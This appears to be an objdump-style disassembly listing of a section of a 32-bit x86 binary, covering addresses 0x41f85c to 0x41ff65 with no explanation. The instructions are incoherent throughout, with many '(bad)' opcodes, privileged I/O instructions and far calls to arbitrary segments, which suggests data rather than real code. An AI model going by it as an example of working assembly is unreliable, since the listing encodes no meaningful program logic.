  41f85c:	mov    ebx,0x918aff2e
  41f861:	gs adc esp,0xffffffc7
  41f865:	sbb    dl,BYTE PTR [edi]
  41f867:	jecxz  0x41f81b
  41f869:	xor    DWORD PTR [ebp+0xf],0x806feb1b
  41f870:	adc    eax,DWORD PTR [ecx]
  41f872:	ds addr16 popa 
  41f875:	jbe    0x41f834
  41f877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f878:	mov    ebx,0xc8aebba1
  41f87d:	int    0x8c
  41f87f:	test   BYTE PTR ds:0x7bf18bf8,dh
  41f885:	sbb    al,BYTE PTR [ebp-0x49fba642]
  41f88b:	(bad)  
  41f88c:	mov    dl,0x4f
  41f88e:	xlat   BYTE PTR ds:[ebx]
  41f88f:	push   ebp
  41f890:	dec    ecx
  41f891:	adc    BYTE PTR [edx+0x24],bh
  41f894:	pop    ebx
  41f895:	cli    
  41f896:	test   BYTE PTR [ecx-0x5],0x88
  41f89a:	dec    ebx
  41f89b:	das    
  41f89c:	inc    ebx
  41f89d:	imul   edi,DWORD PTR [edi+0x60],0x2e
  41f8a1:	aas    
  41f8a2:	cwde   
  41f8a3:	mov    ah,0x8c
  41f8a5:	(bad)  
  41f8a6:	xor    eax,0x338a18aa
  41f8ab:	push   ebx
  41f8ac:	loope  0x41f87b
  41f8ae:	sahf   
  41f8af:	iret   
  41f8b0:	or     ecx,DWORD PTR [eax+0x43]
  41f8b3:	mov    ch,0xee
  41f8b5:	pop    ebp
  41f8b6:	and    cl,ch
  41f8b8:	imul   edx,DWORD PTR [edi+0x59ec461],0xffffffda
  41f8bf:	jae    0x41f90f
  41f8c1:	xor    ah,BYTE PTR [edi+esi*1+0x11be500a]
  41f8c8:	mov    edi,0x14b46fe1
  41f8cd:	pop    edx
  41f8ce:	test   eax,0xc5ced782
  41f8d3:	lods   al,BYTE PTR ds:[esi]
  41f8d4:	inc    eax
  41f8d5:	test   BYTE PTR [ebx-0x2f],cl
  41f8d8:	xchg   esp,eax
  41f8d9:	sbb    cl,0x27
  41f8dc:	mov    ebp,0xc11a8213
  41f8e1:	jno    0x41f870
  41f8e3:	mov    ds:0xf86c9de2,eax
  41f8e8:	fcom   QWORD PTR [edx+0x29f7acc]
  41f8ee:	or     edi,DWORD PTR [ebx+0x37]
  41f8f1:	adc    DWORD PTR [edi+0x55],ebx
  41f8f4:	loopne 0x41f8c1
  41f8f6:	pop    ss
  41f8f7:	cld    
  41f8f8:	cli    
  41f8f9:	in     al,dx
  41f8fa:	out    dx,eax
  41f8fb:	and    ch,0x23
  41f8fe:	xchg   edx,ebp
  41f900:	mov    al,ds:0x15f2bc79
  41f905:	sbb    dh,BYTE PTR [ebx-0x3a]
  41f908:	push   0xffffff9b
  41f90a:	dec    ebp
  41f90b:	leave  
  41f90c:	xor    DWORD PTR [edx+0x5],0x61
  41f910:	xlat   BYTE PTR ds:[ebx]
  41f911:	adc    bl,BYTE PTR [ebx+0x2af38473]
  41f917:	cmp    ch,BYTE PTR [edi+0x2a]
  41f91a:	daa    
  41f91b:	stos   BYTE PTR es:[edi],al
  41f91c:	and    eax,0xa442e803
  41f921:	icebp  
  41f922:	pop    ebp
  41f923:	out    dx,eax
  41f924:	or     DWORD PTR [esi],0x89cf65a5
  41f92a:	(bad)  
  41f92b:	sbb    eax,DWORD PTR [esi]
  41f92d:	add    DWORD PTR [edi],edi
  41f92f:	sub    BYTE PTR [esi],bl
  41f931:	in     al,dx
  41f932:	and    eax,DWORD PTR [ebx-0x6b]
  41f935:	or     eax,0x74684a0a
  41f93a:	xor    al,dh
  41f93c:	mov    bl,0xce
  41f93e:	outs   dx,BYTE PTR cs:[esi]
  41f940:	ret    0x3500
  41f943:	cmc    
  41f944:	ds data16 out 0x48,al
  41f948:	jl     0x41f8cf
  41f94a:	outs   dx,BYTE PTR ds:[esi]
  41f94b:	jmp    0x41f94c
  41f94d:	arpl   bp,sp
  41f94f:	pop    ss
  41f950:	mov    ds:0x30c48c0f,al
  41f955:	scas   al,BYTE PTR es:[edi]
  41f956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f957:	mov    eax,0x6cc9c36
  41f95c:	ins    BYTE PTR es:[edi],dx
  41f95d:	jecxz  0x41f975
  41f95f:	lahf   
  41f960:	add    al,bl
  41f962:	xor    dl,BYTE PTR ds:0xf6689cd7
  41f968:	fild   QWORD PTR [ebp+0x27]
  41f96b:	cmp    al,0xf4
  41f96d:	cmc    
  41f96e:	lahf   
  41f96f:	hlt    
  41f970:	dec    edx
  41f971:	dec    ebx
  41f972:	xchg   edi,eax
  41f973:	out    dx,eax
  41f974:	jge    0x41f9de
  41f976:	je     0x41f999
  41f978:	jbe    0x41f99f
  41f97a:	or     bh,BYTE PTR [edx-0x794c721]
  41f980:	bound  edi,QWORD PTR fs:0x8ca97830
  41f987:	mov    ebx,0x170eae9a
  41f98c:	fcom   QWORD PTR [esi+ebp*2-0x2d]
  41f990:	mov    al,ds:0x1b41e6a1
  41f995:	cli    
  41f996:	mov    dl,0x9b
  41f998:	jo     0x41f973
  41f99a:	dec    ebx
  41f99b:	mov    ebp,0xf08500e
  41f9a0:	pushf  
  41f9a1:	lds    eax,FWORD PTR [ebx+0x50a07e0d]
  41f9a7:	inc    eax
  41f9a8:	retf   
  41f9a9:	in     al,dx
  41f9aa:	xchg   ecx,eax
  41f9ab:	cli    
  41f9ac:	lds    edi,FWORD PTR cs:[esi]
  41f9af:	or     dl,BYTE PTR [ebp+eiz*8-0x60]
  41f9b3:	mov    bh,0xff
  41f9b5:	pop    edx
  41f9b6:	push   cs
  41f9b7:	add    al,0xa1
  41f9b9:	scas   eax,DWORD PTR es:[edi]
  41f9ba:	inc    esp
  41f9bb:	add    bh,BYTE PTR [ecx+edi*1]
  41f9be:	or     al,0x8e
  41f9c0:	hlt    
  41f9c1:	lods   al,BYTE PTR ds:[esi]
  41f9c2:	pop    ebx
  41f9c3:	xor    dh,BYTE PTR [edx]
  41f9c5:	and    eax,0x280bcab3
  41f9ca:	(bad)  
  41f9cb:	mov    edi,0x525f9097
  41f9d0:	call   0xf3af:0x9f27a656
  41f9d7:	jo     0x41f9c6
  41f9d9:	je     0x41f97d
  41f9db:	pop    ecx
  41f9dc:	inc    ebx
  41f9dd:	ja     0x41f9ae
  41f9df:	ins    BYTE PTR es:[edi],dx
  41f9e0:	jg     0x41fa14
  41f9e2:	cmc    
  41f9e3:	mov    bh,0x9e
  41f9e5:	rcl    ebp,0xbb
  41f9e8:	jecxz  0x41fa5a
  41f9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9eb:	dec    ebp
  41f9ec:	out    dx,eax
  41f9ed:	sbb    cl,dh
  41f9ef:	xor    bl,BYTE PTR [ecx+ebp*8+0xf]
  41f9f3:	xlat   BYTE PTR ds:[ebx]
  41f9f4:	add    BYTE PTR [edi],dl
  41f9f6:	out    dx,al
  41f9f7:	xchg   edi,eax
  41f9f8:	inc    esi
  41f9f9:	add    bl,BYTE PTR [esp+edi*2-0x4f]
  41f9fd:	inc    edx
  41f9fe:	add    DWORD PTR [edi],ebx
  41fa00:	repnz out 0x53,eax
  41fa03:	(bad)  
  41fa04:	dec    esp
  41fa05:	sbb    esi,DWORD PTR [ecx]
  41fa07:	js     0x41f9ed
  41fa09:	mov    eax,ds:0x5296824
  41fa0e:	cmp    eax,0x68df9f66
  41fa13:	lods   al,BYTE PTR ds:[esi]
  41fa14:	push   ss
  41fa15:	adc    BYTE PTR [ebp-0x68],bh
  41fa18:	test   BYTE PTR [edx+0x298cac75],cl
  41fa1e:	jg     0x41f9ee
  41fa20:	stos   BYTE PTR es:[edi],al
  41fa21:	push   eax
  41fa22:	mov    esi,DWORD PTR [edx]
  41fa24:	(bad)  
  41fa25:	bound  eax,QWORD PTR [edx-0x70]
  41fa28:	xor    edx,DWORD PTR [edi]
  41fa2a:	arpl   WORD PTR [ebx],dx
  41fa2c:	push   cs
  41fa2d:	je     0x41faab
  41fa2f:	sub    al,0x57
  41fa31:	sbb    BYTE PTR [ebx+0x7e4c371b],al
  41fa37:	mov    bh,0x29
  41fa39:	in     eax,0x36
  41fa3b:	push   edi
  41fa3c:	in     al,0x1b
  41fa3e:	jo     0x41fa34
  41fa40:	xchg   esi,esp
  41fa42:	cmp    al,0x83
  41fa44:	stos   DWORD PTR es:[edi],eax
  41fa45:	xchg   BYTE PTR [edx+0x55],cl
  41fa48:	(bad)  
  41fa49:	das    
  41fa4a:	ja     0x41fa78
  41fa4c:	xchg   edx,eax
  41fa4d:	dec    edx
  41fa4e:	inc    edx
  41fa4f:	adc    eax,0x2596f4fe
  41fa54:	pop    esp
  41fa55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa56:	fild   QWORD PTR [ebp+0x64e402d8]
  41fa5c:	dec    ebx
  41fa5d:	xchg   esi,eax
  41fa5e:	sub    cl,BYTE PTR [ecx]
  41fa60:	cmp    al,0x33
  41fa62:	or     eax,DWORD PTR [ebx-0x31]
  41fa65:	data16 test BYTE PTR [ecx+0x745f7ed],bh
  41fa6c:	hlt    
  41fa6d:	stos   BYTE PTR es:[edi],al
  41fa6e:	inc    esp
  41fa6f:	xchg   edi,eax
  41fa70:	sub    dl,BYTE PTR [edx-0xe]
  41fa73:	push   cs
  41fa74:	pop    ebx
  41fa75:	push   ebx
  41fa76:	jns    0x41fa55
  41fa78:	dec    ecx
  41fa79:	jmp    0xa2d4:0x2aab6e95
  41fa80:	outs   dx,BYTE PTR ds:[esi]
  41fa81:	pop    esi
  41fa82:	sub    esp,DWORD PTR [eax+0x7]
  41fa85:	lea    ebp,[esi+0x48]
  41fa88:	test   DWORD PTR [ecx+0x1b2d0069],ebx
  41fa8e:	loop   0x41faf5
  41fa90:	inc    ebp
  41fa91:	popf   
  41fa92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa93:	push   esi
  41fa94:	cli    
  41fa95:	dec    edi
  41fa96:	pop    ss
  41fa97:	imul   eax,DWORD PTR [ecx+0x3c],0x23
  41fa9b:	jno    0x41fadc
  41fa9d:	nop
  41fa9e:	inc    eax
  41fa9f:	cmp    al,0x21
  41faa1:	or     DWORD PTR [ebx+0x4bb798d0],esp
  41faa7:	mov    esp,0x9a561f87
  41faac:	hlt    
  41faad:	lock mov bl,0xaf
  41fab0:	inc    edx
  41fab1:	push   ss
  41fab2:	jg     0x41fb2b
  41fab4:	cwde   
  41fab5:	mov    esi,0xd90f3328
  41faba:	sub    ebp,DWORD PTR [ecx]
  41fabc:	push   cs
  41fabd:	sbb    esi,DWORD PTR [eax]
  41fabf:	int3   
  41fac0:	repnz cmp edx,ecx
  41fac3:	mov    ebp,0x593be390
  41fac8:	test   eax,edi
  41faca:	lods   eax,DWORD PTR ds:[esi]
  41facb:	popf   
  41facc:	pop    esi
  41facd:	clc    
  41face:	pop    ss
  41facf:	in     eax,0x43
  41fad1:	push   edi
  41fad2:	xor    eax,0xfca0a744
  41fad7:	inc    ebx
  41fad8:	mov    al,ds:0xfbc43c33
  41fadd:	jns    0x41fa79
  41fadf:	scas   eax,DWORD PTR es:[edi]
  41fae0:	out    dx,al
  41fae1:	inc    esp
  41fae2:	sub    eax,0xbc7783c
  41fae7:	cli    
  41fae8:	inc    ebx
  41fae9:	mov    al,0x11
  41faeb:	mov    al,0x72
  41faed:	mov    dl,0xab
  41faef:	dec    ebp
  41faf0:	mov    eax,ds:0x6f09650
  41faf5:	or     al,0xf6
  41faf7:	js     0x41faf4
  41faf9:	cmp    DWORD PTR ds:0x41cfa8fb,0xffffffb0
  41fb00:	fistp  WORD PTR [esi+0x5]
  41fb03:	mov    esi,0x2c31f291
  41fb08:	iret   
  41fb09:	sbb    DWORD PTR [ebx+edx*4-0x20203e41],ecx
  41fb10:	mov    cs,cx
  41fb13:	sub    dl,BYTE PTR [edi+0x6ea9be05]
  41fb19:	cwde   
  41fb1a:	cdq    
  41fb1b:	dec    esp
  41fb1c:	and    edx,esp
  41fb1e:	xor    ebx,DWORD PTR [ecx+esi*8]
  41fb21:	popa   
  41fb22:	fisub  WORD PTR [edx+esi*8]
  41fb25:	fnstcw WORD PTR [ebx+0x41]
  41fb28:	pop    ecx
  41fb29:	xor    cl,dh
  41fb2b:	lar    ebp,WORD PTR [eax]
  41fb2e:	scas   eax,DWORD PTR es:[edi]
  41fb2f:	aaa    
  41fb30:	xrelease xchg BYTE PTR fs:[esi],dl
  41fb34:	cdq    
  41fb35:	js     0x41fb0e
  41fb37:	orps   xmm5,XMMWORD PTR [esi+0x297288ea]
  41fb3e:	fwait
  41fb3f:	mov    dl,0x1
  41fb41:	mov    bh,0x4d
  41fb43:	xor    DWORD PTR [ebx-0x25],0xf236cee5
  41fb4a:	hlt    
  41fb4b:	popa   
  41fb4c:	jg     0x41fb35
  41fb4e:	data16 sbb al,0x4
  41fb51:	fistp  WORD PTR [edx+ebx*4+0x4f]
  41fb55:	sbb    al,0xcb
  41fb57:	(bad)  
  41fb58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb59:	ins    DWORD PTR es:[edi],dx
  41fb5a:	fwait
  41fb5b:	jns    0x41fb0e
  41fb5d:	jp     0x41fafa
  41fb5f:	adc    BYTE PTR [edi-0x4b62f2e4],bh
  41fb65:	nop
  41fb66:	repnz cmp DWORD PTR [ebx+esi*8-0x610bf9e],esi
  41fb6e:	xor    ch,bl
  41fb70:	mov    ebp,0x6a0c81d0
  41fb75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb76:	inc    eax
  41fb77:	inc    eax
  41fb78:	out    0xa4,al
  41fb7a:	push   cs
  41fb7b:	mov    dh,bl
  41fb7d:	pushf  
  41fb7e:	pop    ss
  41fb7f:	inc    ecx
  41fb80:	cs xor eax,0x9bae993c
  41fb86:	ret    
  41fb87:	push   ebx
  41fb88:	jp     0x41fb52
  41fb8a:	mov    BYTE PTR [edx-0x36],bl
  41fb8d:	sub    BYTE PTR [ebx+0x7f],0xd3
  41fb91:	lods   eax,DWORD PTR ds:[esi]
  41fb92:	fs xor esi,esp
  41fb95:	or     BYTE PTR [esi+0x351ef082],bh
  41fb9b:	aam    0xda
  41fb9d:	call   0xa48a026b
  41fba2:	xor    DWORD PTR [edi+0x19],0x6f
  41fba6:	sub    ebp,eax
  41fba8:	mov    ecx,0x3dba57c
  41fbad:	test   BYTE PTR [edx+0x42],al
  41fbb0:	jne    0x41fb86
  41fbb2:	dec    ecx
  41fbb3:	sbb    DWORD PTR [ebx+0x5e],ebx
  41fbb6:	push   ds
  41fbb7:	jecxz  0x41fb3d
  41fbb9:	or     eax,0xcf153379
  41fbbe:	ss mov esp,0xbe8470e5
  41fbc4:	loopne 0x41fb82
  41fbc6:	aas    
  41fbc7:	sbb    dh,BYTE PTR [eax-0x1c]
  41fbca:	es push es
  41fbcc:	pop    ebp
  41fbcd:	xchg   edx,eax
  41fbce:	mov    al,0xf0
  41fbd0:	mov    edx,0x6a14e4d0
  41fbd5:	push   cs
  41fbd6:	cmp    DWORD PTR [eax+ecx*8+0x27bd0b59],esi
  41fbdd:	ret    0xc22e
  41fbe0:	iret   
  41fbe1:	fild   QWORD PTR [edx+edi*2+0x58]
  41fbe5:	or     esi,DWORD PTR [ecx+0x7a]
  41fbe8:	outs   dx,DWORD PTR ds:[esi]
  41fbe9:	push   0xbc7f5c4d
  41fbee:	and    esp,DWORD PTR [ecx]
  41fbf0:	mov    ah,0xec
  41fbf2:	add    ecx,ebx
  41fbf4:	fbld   TBYTE PTR fs:[ebx+0x3d]
  41fbf8:	lahf   
  41fbf9:	inc    ebp
  41fbfa:	xchg   edi,eax
  41fbfb:	into   
  41fbfc:	cdq    
  41fbfd:	pusha  
  41fbfe:	sbb    al,BYTE PTR [ebp-0x2f]
  41fc01:	pop    ss
  41fc02:	repnz test eax,0xc9109639
  41fc08:	lea    ebp,[ecx-0x7c8452ac]
  41fc0e:	ror    BYTE PTR [ebx-0x4c],cl
  41fc11:	xchg   ecx,eax
  41fc12:	scas   eax,DWORD PTR es:[edi]
  41fc13:	and    DWORD PTR [ebx+edi*8-0x13],esp
  41fc17:	xor    edi,DWORD PTR [eax]
  41fc19:	mov    ebp,0xbcbbb964
  41fc1e:	pop    ds
  41fc1f:	pop    edx
  41fc20:	dec    edx
  41fc21:	add    eax,0xd3381ffc
  41fc26:	mov    dh,BYTE PTR [eax-0x3e]
  41fc29:	dec    ecx
  41fc2a:	cwde   
  41fc2b:	div    BYTE PTR [edx-0x66]
  41fc2e:	inc    esp
  41fc2f:	sbb    DWORD PTR [edx+esi*4-0x62537750],esi
  41fc36:	cmp    eax,0xf2b0bfab
  41fc3b:	aas    
  41fc3c:	stos   BYTE PTR es:[edi],al
  41fc3d:	mov    al,0x77
  41fc3f:	jecxz  0x41fc79
  41fc41:	pop    ebx
  41fc42:	gs cmp al,0x86
  41fc45:	pop    eax
  41fc46:	aad    0xe9
  41fc48:	shl    DWORD PTR [edi+ebp*1-0x64],1
  41fc4c:	clc    
  41fc4d:	fs mov esp,0x2594dcda
  41fc53:	sub    al,0xab
  41fc55:	icebp  
  41fc56:	xchg   dl,dl
  41fc58:	jb     0x41fc31
  41fc5a:	pop    esp
  41fc5b:	nop
  41fc5c:	or     esi,DWORD PTR [esi+0x52]
  41fc5f:	outs   dx,DWORD PTR ds:[esi]
  41fc60:	div    DWORD PTR [ecx]
  41fc62:	icebp  
  41fc63:	cli    
  41fc64:	fdivr  DWORD PTR [ebp-0x42]
  41fc67:	ror    bh,0xe8
  41fc6a:	call   0xbf1b:0x780180f9
  41fc71:	fisub  WORD PTR [edi+ebp*2]
  41fc74:	cmp    ah,al
  41fc76:	pop    esi
  41fc77:	cli    
  41fc78:	push   ds
  41fc79:	and    BYTE PTR [edi+0x6bd5f6c7],ah
  41fc7f:	push   0xe0e78869
  41fc84:	ins    BYTE PTR es:[edi],dx
  41fc85:	jo     0x41fcd1
  41fc87:	(bad)  
  41fc88:	out    0x82,eax
  41fc8a:	inc    ebx
  41fc8b:	(bad)  
  41fc8c:	sub    ebx,DWORD PTR [edi]
  41fc8e:	mov    cl,0x62
  41fc90:	add    BYTE PTR [ebx-0x1f],0xe
  41fc94:	mov    ds:0xbd0ef463,al
  41fc99:	lea    esi,[edx-0x21]
  41fc9c:	push   ss
  41fc9d:	push   edi
  41fc9e:	push   ecx
  41fc9f:	inc    ecx
  41fca0:	popf   
  41fca1:	sub    dh,dl
  41fca3:	pushf  
  41fca4:	dec    esi
  41fca5:	push   0x44
  41fca7:	les    esp,FWORD PTR [edx-0xf]
  41fcaa:	in     eax,0xf
  41fcac:	pop    ss
  41fcad:	dec    esp
  41fcae:	push   es
  41fcaf:	and    DWORD PTR cs:[ebx-0x3f],0x4b7f581d
  41fcb7:	ror    DWORD PTR [ecx+0x6a60de3e],1
  41fcbd:	xchg   edi,eax
  41fcbe:	pushf  
  41fcbf:	jp     0x41fce0
  41fcc1:	adc    BYTE PTR [eax-0x79cee303],bh
  41fcc7:	popa   
  41fcc8:	xchg   ebx,eax
  41fcc9:	in     al,dx
  41fcca:	stos   BYTE PTR es:[edi],al
  41fccb:	adc    al,0x13
  41fccd:	jb     0x41fd2c
  41fccf:	inc    ebp
  41fcd0:	ds add eax,0x7f713174
  41fcd6:	jne    0x41fd26
  41fcd8:	xchg   edx,eax
  41fcd9:	xor    DWORD PTR [ecx-0x2e18ed98],esp
  41fcdf:	add    DWORD PTR [edi-0x1c],esi
  41fce2:	test   eax,0xfda5bb64
  41fce7:	inc    eax
  41fce8:	ds stc 
  41fcea:	mov    edi,0x7b95dc13
  41fcef:	ret    
  41fcf0:	mov    bh,BYTE PTR es:[ecx+0x4b]
  41fcf4:	lods   eax,DWORD PTR ds:[esi]
  41fcf5:	pop    edx
  41fcf6:	xor    BYTE PTR [ebp-0x6ace25e3],dl
  41fcfc:	popa   
  41fcfd:	sub    ah,bh
  41fcff:	mov    dl,0x49
  41fd01:	push   es
  41fd02:	pop    edi
  41fd03:	int3   
  41fd04:	shl    BYTE PTR [ecx+0x2262249f],0x6b
  41fd0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd0d:	mov    ah,0xac
  41fd0f:	pop    ebx
  41fd10:	(bad)  
  41fd12:	test   eax,0x2318412b
  41fd17:	dec    eax
  41fd18:	icebp  
  41fd19:	cmp    BYTE PTR [esi*4-0x156c639],0x51
  41fd21:	dec    esp
  41fd22:	mov    esp,0x3a49a8e8
  41fd27:	stc    
  41fd28:	jle    0x41fcc5
  41fd2a:	mov    esi,0x31f5ad1d
  41fd2f:	mov    eax,0xa6e14e45
  41fd34:	adc    BYTE PTR [eax],al
  41fd36:	ret    
  41fd37:	add    al,0xf8
  41fd39:	push   eax
  41fd3a:	xchg   edi,eax
  41fd3b:	and    cl,BYTE PTR [ebx+ebx*2-0x32]
  41fd3f:	sub    DWORD PTR ds:0x32136c17,esp
  41fd45:	std    
  41fd46:	clc    
  41fd47:	jge    0x41fd84
  41fd49:	add    DWORD PTR [esi-0x37],edi
  41fd4c:	test   DWORD PTR [edi-0x16],ebp
  41fd4f:	dec    esp
  41fd50:	repz dec eax
  41fd52:	dec    eax
  41fd53:	sub    BYTE PTR [eax+0x53],dh
  41fd56:	xlat   BYTE PTR ds:[ebx]
  41fd57:	dec    edi
  41fd58:	daa    
  41fd59:	mov    dh,0xe4
  41fd5b:	push   ss
  41fd5c:	(bad)  
  41fd5d:	retf   
  41fd5e:	cdq    
  41fd5f:	lods   eax,DWORD PTR ds:[esi]
  41fd60:	jge    0x41fd0a
  41fd62:	sub    eax,0x5ccb45df
  41fd67:	dec    ebx
  41fd68:	xor    DWORD PTR [ebx+eax*8+0x74bb204b],ebp
  41fd6f:	mov    ch,0x2e
  41fd71:	cmp    BYTE PTR [edx-0x7d],al
  41fd74:	fpatan 
  41fd76:	in     al,0xa5
  41fd78:	mov    ch,0xf0
  41fd7a:	rcl    DWORD PTR [ebp-0x118f3e08],0x4
  41fd81:	or     DWORD PTR [esi+0x6b4f3981],0x26
  41fd88:	call   0xee99:0xdac7ae69
  41fd8f:	push   ecx
  41fd90:	push   eax
  41fd91:	in     eax,dx
  41fd92:	sti    
  41fd93:	fnstcw WORD PTR [edi+0x50]
  41fd96:	jnp    0x41fd41
  41fd98:	mov    eax,ds:0xd8002f88
  41fd9d:	mov    esi,0xa6e89f9f
  41fda2:	mov    al,ds:0x45c0e1da
  41fda7:	loop   0x41fda0
  41fda9:	add    BYTE PTR [ecx],dl
  41fdab:	dec    edi
  41fdac:	popa   
  41fdad:	push   ss
  41fdae:	push   0xd
  41fdb0:	jp     0x41fd50
  41fdb2:	pop    edi
  41fdb3:	(bad)  
  41fdb4:	dec    BYTE PTR [edi-0x23]
  41fdb7:	inc    ebx
  41fdb8:	xor    DWORD PTR [esi+0x37771106],edi
  41fdbe:	push   esp
  41fdbf:	add    al,0x8a
  41fdc1:	out    dx,eax
  41fdc2:	bnd jmp 0x6bc51e8e
  41fdc8:	mov    DWORD PTR [esi],eax
  41fdca:	sub    al,BYTE PTR [ecx-0x5618c23e]
  41fdd0:	xchg   ebx,eax
  41fdd1:	pushf  
  41fdd2:	hlt    
  41fdd3:	imul   eax,DWORD PTR [edi-0x4d],0x2c7fca00
  41fdda:	jbe    0x41fd71
  41fddc:	mov    esi,0x64c71a3b
  41fde1:	pop    edi
  41fde2:	gs xor eax,0x7bcf85ed
  41fde8:	outs   dx,DWORD PTR ds:[esi]
  41fde9:	mov    edi,DWORD PTR [esi-0x29]
  41fdec:	push   es
  41fded:	sbb    eax,0xf7820506
  41fdf2:	cmp    al,0x85
  41fdf4:	dec    eax
  41fdf5:	adc    BYTE PTR [esi-0x66],cl
  41fdf8:	imul   edi,DWORD PTR [edx+esi*1],0x7e711d32
  41fdff:	shl    DWORD PTR [esi+0x5e6a63e4],0xe8
  41fe06:	xlat   BYTE PTR ds:[ebx]
  41fe07:	iret   
  41fe08:	ret    0xb7d2
  41fe0b:	mov    al,ds:0x7409e37
  41fe10:	pop    esp
  41fe11:	inc    edx
  41fe12:	scas   eax,DWORD PTR es:[edi]
  41fe13:	sbb    ecx,DWORD PTR [eax]
  41fe15:	mov    al,0x9a
  41fe17:	sub    cl,dh
  41fe19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe1a:	out    dx,eax
  41fe1b:	and    BYTE PTR [esi-0x7b01cd93],ah
  41fe21:	nop
  41fe22:	fldz   
  41fe24:	mov    esp,0x6b3037b2
  41fe29:	jnp    0x41fe4b
  41fe2b:	mov    al,ds:0x4c0b2793
  41fe30:	fwait
  41fe31:	lds    eax,FWORD PTR [ecx-0x7bf7ea2c]
  41fe37:	ret    0x65df
  41fe3a:	in     eax,dx
  41fe3b:	xchg   DWORD PTR [esi-0x7e],ecx
  41fe3e:	loopne 0x41fe0d
  41fe40:	mov    bl,BYTE PTR [edx]
  41fe42:	sbb    bl,ah
  41fe44:	lahf   
  41fe45:	pusha  
  41fe46:	push   esp
  41fe47:	xchg   DWORD PTR [ecx+0x31],eax
  41fe4a:	cmp    eax,0xbbc73aab
  41fe4f:	ins    DWORD PTR es:[edi],dx
  41fe50:	pop    eax
  41fe51:	pop    ebp
  41fe52:	push   edx
  41fe53:	and    BYTE PTR [eax-0x4d0fbb9d],0x80
  41fe5a:	fnstsw WORD PTR [edi+eiz*8-0x4e]
  41fe5e:	xchg   BYTE PTR [ebx],al
  41fe60:	dec    esi
  41fe61:	cmp    edi,DWORD PTR [edi+0x4f60f0e1]
  41fe67:	pop    ss
  41fe68:	stos   DWORD PTR es:[edi],eax
  41fe69:	dec    ecx
  41fe6a:	fidivr WORD PTR [edi+0x36]
  41fe6d:	lods   eax,DWORD PTR ds:[esi]
  41fe6e:	mov    edx,0x6595fc63
  41fe73:	scas   eax,DWORD PTR es:[edi]
  41fe74:	jns    0x41fe3b
  41fe76:	sbb    al,0x33
  41fe78:	sbb    cl,dl
  41fe7a:	adc    esp,DWORD PTR [edi]
  41fe7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe7d:	jge    0x41feaf
  41fe7f:	(bad)  
  41fe80:	mov    bl,0x86
  41fe82:	xchg   esi,eax
  41fe83:	es out 0x49,eax
  41fe86:	and    eax,0x5170dedd
  41fe8b:	mov    dh,0xc6
  41fe8d:	call   0xe2d5:0x5a130d07
  41fe94:	xlat   BYTE PTR ds:[ebx]
  41fe95:	dec    ebx
  41fe96:	cmp    bh,BYTE PTR [ecx]
  41fe98:	sub    esi,ebp
  41fe9a:	pushf  
  41fe9b:	or     DWORD PTR [ecx+0x4d7c7f18],0xcc42e2a9
  41fea5:	leave  
  41fea6:	mov    al,ds:0xca6889ff
  41feab:	xor    DWORD PTR [edx-0x6946e53f],ebp
  41feb1:	test   esi,ebx
  41feb3:	and    eax,0x71e6ceec
  41feb8:	mov    BYTE PTR [eax+ebx*2-0x20],dh
  41febc:	lds    esp,FWORD PTR [edi-0x194c1f32]
  41fec2:	mov    ah,0xd9
  41fec4:	and    bl,BYTE PTR [esi+0x79bca059]
  41feca:	arpl   WORD PTR [edi+0x2aecb6cb],bx
  41fed0:	mov    esp,0x567dfd4a
  41fed5:	clc    
  41fed6:	mov    esp,0x40800a1d
  41fedb:	pop    esp
  41fedc:	iret   
  41fedd:	mov    ah,0xb8
  41fedf:	dec    DWORD PTR [esi+0x7c]
  41fee2:	ins    DWORD PTR es:[edi],dx
  41fee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fee4:	jae    0x41fe89
  41fee6:	pop    edi
  41fee7:	pop    esp
  41fee8:	cwde   
  41fee9:	xor    DWORD PTR [ebx-0x1c83813e],ecx
  41feef:	int    0x4
  41fef1:	mov    bh,0x24
  41fef3:	inc    edi
  41fef4:	rol    BYTE PTR [ebx-0x3f],0x33
  41fef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fef9:	pop    ss
  41fefa:	jb     0x41feae
  41fefc:	pop    ebx
  41fefd:	adc    al,0x64
  41feff:	call   DWORD PTR [ecx]
  41ff01:	or     esi,eax
  41ff03:	fdiv   QWORD PTR [eax+ecx*2-0x2d3fc0c8]
  41ff0a:	ins    DWORD PTR es:[edi],dx
  41ff0b:	imul   ecx,esp,0x26a04828
  41ff11:	retf   
  41ff12:	mov    ebp,0x36834e71
  41ff17:	add    eax,0x1ce84b9a
  41ff1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff1d:	sub    al,0x30
  41ff1f:	pop    ds
  41ff20:	icebp  
  41ff21:	jno    0x41fed8
  41ff23:	dec    ecx
  41ff24:	sbb    al,0xb1
  41ff26:	sbb    BYTE PTR [ebp+0x13489e17],dl
  41ff2c:	daa    
  41ff2d:	xor    DWORD PTR [edi],esp
  41ff2f:	fldcw  WORD PTR [edi+0x3392b0a7]
  41ff35:	dec    eax
  41ff36:	lahf   
  41ff37:	(bad)  
  41ff39:	test   BYTE PTR ds:0x15d6e3ec,dh
  41ff3f:	imul   edi,esp,0xffffffad
  41ff42:	or     BYTE PTR [esi-0x77a20f22],dl
  41ff48:	and    ah,BYTE PTR [esi-0x74]
  41ff4b:	jbe    0x41ff35
  41ff4d:	in     eax,dx
  41ff4e:	sti    
  41ff4f:	mov    DWORD PTR [ecx+0x2c],ebp
  41ff52:	sub    al,0xb5
  41ff54:	lahf   
  41ff55:	daa    
  41ff56:	test   eax,0xc9b25d
  41ff5b:	lods   al,BYTE PTR ds:[esi]
  41ff5c:	icebp  
  41ff5d:	add    eax,0x546635e6
  41ff62:	sub    al,0xee
  41ff64:	pop    eax
  41ff65:	xchg   ebx,eax
